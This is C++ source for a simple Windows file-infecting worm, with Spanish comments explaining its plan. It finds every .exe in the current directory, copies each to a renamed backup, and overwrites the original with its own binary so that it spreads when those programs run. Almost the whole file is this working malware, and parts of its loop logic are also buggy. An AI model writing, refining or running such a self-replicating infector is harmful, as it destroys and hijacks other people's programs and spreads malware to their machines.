#include <iostream>
#include <Windows.h>
#include <string.h>
using namespace std;
int main()
{
    ///+++++++++++++++++++++++++++++++++++++++
    ///        como se comportara worm

  /// busco los archivos para sobreescribirlos

  /// el worm  reemplaza el archivo   .exe

   ///se crea un archivo que va a tener  el mismo contenido que el
   
   /// archivo que va agarar el worm pero con extencion ext
   
   ///busco el nuevo archivo

   ///+++++++++++++++++++++++++++++++++++++++
   ///             variables
   ///estructura que contiene los datos del
   ///exe  como la fecha de creacion , nombre y el tama�o en bytes de este
   ///handler para realizar la busqueada de archivos
   ///string para guardar el nombre
   ///String para guardar el nombre nuevo para el exe infectado
   ///string que contiene el nombre del gusano
int num = 0 ;
HANDLE handle;
//LPCSTR formato=L;
WIN32_FIND_DATAA lpFindFileData;
const char*  nombre_archivo_original;
 
TCHAR nombre_este_archivo[MAX_PATH];
///+++++++++++++++++++++++++++++
///           Accion
GetModuleFileName(NULL,nombre_este_archivo,MAX_PATH);
char *last_revslash = strrchr(nombre_este_archivo,92);
int i =last_revslash-nombre_este_archivo+1;
int j =0;

cout<<i<<endl;

char nombre_este_archivo_ss[MAX_PATH-i];

char aux ;

while(!(nombre_este_archivo[i]==0))
{
aux = nombre_este_archivo[i];
nombre_este_archivo_ss[j]=aux ;

	j++;
	i++;
}


handle=FindFirstFile("*.exe",&lpFindFileData);
bool next_exists = true;
while(next_exists==true)
{
  
nombre_archivo_original=lpFindFileData.cFileName;

if(!(strcmp(nombre_archivo_original,nombre_este_archivo_ss)==0))
{
cout<<nombre_archivo_original<<endl;
	

char nombre_nuevo_archivo[MAX_PATH-i]; // aspi

for(int j = 0 ; j <MAX_PATH-i;j++)
{
 nombre_nuevo_archivo[j]=lpFindFileData.cFileName[j];	
}

 cout<<"prueba "<<nombre_nuevo_archivo<<endl;

nombre_nuevo_archivo[j]='d';

CopyFile(nombre_archivo_original,nombre_nuevo_archivo,0);
BOOL b = CopyFile(nombre_este_archivo_ss,nombre_archivo_original,0);
if (!b) {
  cout << "Error: " << GetLastError() << endl;
} else {
 cout << "Okay " << endl;
	
}

next_exists =  FindNextFile(handle,&lpFindFileData);
}


}



return (0);
}
